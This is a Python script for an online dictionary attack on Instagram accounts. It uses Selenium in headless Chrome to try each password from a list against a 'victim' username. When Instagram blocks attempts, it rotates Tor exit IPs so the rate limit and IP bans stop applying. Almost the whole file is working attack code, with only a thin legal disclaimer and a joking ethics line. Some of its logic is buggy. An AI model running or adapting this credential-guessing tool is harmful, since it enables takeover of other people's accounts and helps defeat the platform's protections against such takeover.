from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from bs4 import BeautifulSoup
from stem import Signal
from stem.control import Controller
from optparse import OptionParser
import random
import time
import sys


banner = """
-----------------------------------------------
|---------------------------------------------|
|        Instagram Dictionary Attack          |
|---------------------------------------------|
| # Author: IVBecy                            |
|                                             |
| # This script uses TOR proxies              |
|                                             |
| # It is the end user"s responsibility       |
|  to obey all applicable laws.               |
|                                             |
|---------------------------------------------|
-----------------------------------------------
"""

#USAGE
def usage():
    print("""\n

    Usage: insta.py [-u] username [-l] passwordlist

    REQUIRED:
        -u or --username: The username of the victim
        -l or --list: The password list to be used 
    HELP:
        -h or --help
        
    """)
    sys.exit()

#Setting up the options for the terminal
parser = OptionParser()
parser.set_conflict_handler("resolve")
parser.add_option("-u", "--username", dest="uname")
parser.add_option("-h", "--help", dest="help", action="store_true")
parser.add_option("-l", "--list", dest="passlist")
(options, args) = parser.parse_args()

# If the username is set, the help menu cannot be shown (if called at the same time)
if options.uname:
  options.help = None
# Run the help menu
### If the username is not defined
if options.uname == None:
  usage()
### If the passlist is not defined
if options.passlist == None:
  usage()
### If the user has asked for help
if options.help:
  usage()

### Variables
LOGIN_URL = "https://www.instagram.com/accounts/login/"
PROXY = "socks5://127.0.0.1:9050"
IP_CHECK_SITE = "http://icanhazip.com"
fetchTime = 4
global uname, passlist
uname = options.uname
passlist = options.passlist
beginning = 0
end = 1
hopCount = 1
#bad titles
badtitles = [
  "Login • Instagram",  
  "Page Not Found &bull; Instagram",
  "Page Not Found • Instagram",
]
#messages that sign that the IP is banned
bannedIPStrs = [
  "Please wait a few minutes before you try again",
  "We couldn't connect",
  "There was a problem logging you into Instagram",
  "Page not found"
]
#messages that sign that we are in
LoggedInMsgs = [
  'class="no-js logged-in',
  "Suspicious Login Attempt"
]
#message(s) that sign that we are OUT
LoggedOutMsgs = [
  "incorrect"
]

# Web driver
options = webdriver.ChromeOptions()
options.add_argument(f"--proxy-server={PROXY}")
options.add_experimental_option('excludeSwitches', ['enable-logging'])
options.add_argument("headless")
driver = webdriver.Chrome(options=options)

# Class for all the methods we need
class Engine():
  def __init__(self):
    self.username =  uname
    self.passlist = passlist

  # Deal with the file and new password + increment counters
  def takefile(self):
    global beginning,end,p,hopCount
    if hopCount == 1:
      print(banner)
      print("\n")
    passwordFile = open(passlist, "r")
    passw = passwordFile.readlines()[beginning:end]
    for p in passw:
      p = str(p)
      p = p.replace("[", "")
      p = p.replace("]", "")
      p = p.replace("'", "")
      p = p.replace("\n", "")
      p = p.replace(",", "")
    passwordFile.close()
    print("------------------------------")
    print(f"Username: {uname}")
    print(f"Password: {p}")
    print(f"Number of tries: {hopCount}")
    print("------------------------------")
    beginning += 1
    end += 1
    hopCount += 1
    return p

  # New TOR IP + new browser
  def renew_tor_ip(self):
    global driver
    with Controller.from_port(port=9051) as controller:
      time.sleep(fetchTime - 2)
      controller.authenticate()
      controller.signal(Signal.NEWNYM)
      print("[!] New IP is assigned")
      print("[!] New browser is opened")
      print("------------------------------")
      print("\n")
      driver.quit()
      options = webdriver.ChromeOptions()
      options.add_argument(f"--proxy-server={PROXY}")
      options.add_experimental_option('excludeSwitches', ['enable-logging'])
      options.add_argument("headless")
      driver = webdriver.Chrome(options=options)
      return controller
    
  # logging in to insta 
  def loginProcedure(self):
    driver.get(LOGIN_URL)
    while driver.current_url != LOGIN_URL:
      driver.get(LOGIN_URL)
    time.sleep(fetchTime)
    #banned ip
    for string in bannedIPStrs:
      if string in driver.page_source:
        print("[!] IP banned by Instagram")
        self.renew_tor_ip()
        global beginning, end
        beginning -= 1
        end -= 1
        driver.get(LOGIN_URL)
        time.sleep(fetchTime)
    username_field = driver.find_element_by_name("username")
    password_field = driver.find_element_by_name("password")
    username_field.send_keys(uname)
    if len(p) < 6:
      p + "111111"
      password_field.send_keys(p)
    else:
      password_field.send_keys(p)
    submit = driver.find_element_by_class_name("sqdOP.L3NKy.y3zKF")
    submit.click()
    time.sleep(fetchTime + 1)
    return driver.page_source

  # Login detection
  def getError(self):
    global driver
    soup = BeautifulSoup(driver.page_source, "html.parser")
    #banned ip
    for string in bannedIPStrs:
      if string in driver.page_source:
        print("[!] IP banned by Instagram")
        self.renew_tor_ip()
        global beginning, end
        beginning -= 1
        end -= 1
        return None
    #other login possibilities
    for msgs in LoggedInMsgs:
      if msgs in soup:
        for i in range(2):
          print("\n")
        print("[+] Password found")
        print(f"Password: {p}")
        print(f"Username: {uname}")
        print("\n")
        driver.quit()
        sys.exit()
    # title
    if soup.title.string in badtitles:
      print("[-] No match")    
      print("------------------------------")
      print("\n")
     # title
    elif "incorrect" in badtitles:
      print("[-] No match")
      print("------------------------------")
      print("\n")
    # good title
    else:
      for i in range(2):
        print("\n")
      print("[+] Password found")
      print(f"Password: {p}")
      print(f"Username: {uname}")
      print("\n")
      driver.quit()
      sys.exit()
    
#Looping
while True:
  BRUTER = Engine()
  BRUTER.takefile()
  BRUTER.loginProcedure()
  BRUTER.getError()
  
# Happy hacki... No, no, no, only for ethical purposes 
